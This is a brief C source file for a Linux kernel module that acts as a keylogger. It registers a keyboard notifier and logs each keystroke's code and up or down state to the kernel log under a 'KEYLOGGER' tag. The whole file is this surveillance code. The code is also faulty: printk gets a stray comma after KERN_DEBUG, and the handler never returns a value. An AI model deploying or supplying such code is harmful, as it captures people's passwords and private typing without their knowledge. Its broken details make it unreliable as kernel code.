#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>


int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    struct vc_data *vc = param->vc;

    int ret = NOTIFY_OK;

    if (code == KBD_KEYCODE)
    {
        printk(KERN_DEBUG, "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
    }
}

static struct notifier_block nb = {
        .notifier_call = hello_notify
};

static int hello_init(void)
{
    register_keyboard_notifier(&nb);
    return 0;
}

static void hello_release(void)
{
    unregister_keyboard_notifier(&nb);
}

module_init(hello_init);
module_exit(hello_release);
